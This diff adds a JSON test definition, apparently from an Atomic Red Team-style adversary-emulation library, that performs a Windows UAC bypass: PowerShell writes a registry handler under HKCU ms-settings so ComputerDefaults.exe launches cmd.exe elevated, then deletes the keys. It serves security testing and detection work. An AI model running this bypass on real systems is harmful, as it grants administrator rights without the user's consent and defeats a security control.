@@ -1,0 +1,52 @@
+{
+  "id": "3c51abf2-44bf-42d8-9111-dc96ff66750f",
+  "name": "Bypass UAC using ComputerDefaults (PowerShell)",
+  "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "ec66b348-6dd9-4b55-8ba3-528d276e5bb4",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "32b39c3c-2e05-4ac1-bc9b-7df1f8cf4320",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "ec66b348-6dd9-4b55-8ba3-528d276e5bb4",
+      "p": "on-success",
+      "o": "32b39c3c-2e05-4ac1-bc9b-7df1f8cf4320"
+    },
+    {
+      "s": "ec66b348-6dd9-4b55-8ba3-528d276e5bb4",
+      "p": "on-failure",
+      "o": "32b39c3c-2e05-4ac1-bc9b-7df1f8cf4320"
+    }
+  ],
+  "tags": [
+    "T1548.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "executable_binary",
+      "type": "path",
+      "description": "Binary to execute with UAC Bypass",
+      "value": "C:\\Windows\\System32\\cmd.exe"
+    }
+  ]
+}
